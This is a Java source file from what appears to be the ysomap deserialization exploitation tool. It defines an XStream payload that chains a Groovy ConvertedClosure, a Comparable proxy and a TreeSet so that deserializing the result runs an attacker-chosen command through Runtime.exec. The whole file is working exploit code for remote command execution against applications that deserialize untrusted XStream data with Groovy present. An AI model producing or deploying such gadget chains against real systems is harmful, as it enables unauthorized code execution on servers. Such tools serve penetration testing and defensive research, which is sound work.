package ysomap.core.payload.xstream;

import groovy.lang.Closure;
import org.codehaus.groovy.runtime.ConvertedClosure;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.groovy.ClosureWithRuntimeBullet;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;

import java.lang.reflect.Proxy;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"Gadget For XStream","org.codehaus.groovy:groovy:2.4.3"})
@Require(bullets = {"ClosureWithRuntimeBullet"})
public class GroovyConvertedClosure extends Payload<Object> {

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new ClosureWithRuntimeBullet().set("command",command);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        // 这条利用链 需要配合存在参数的函数调用，比如Runtime.exec(command)
        // 也可以扩展js引擎eval那种
        Object command = bullet.get("command");
        ConvertedClosure handler = new ConvertedClosure((Closure) obj, "compareTo");
        Object map = Proxy.newProxyInstance(
                GroovyConvertedClosure.class.getClassLoader(),
                new Class<?>[]{Comparable.class}, handler);
        return PayloadHelper.makeTreeSet(command, map);
    }
}
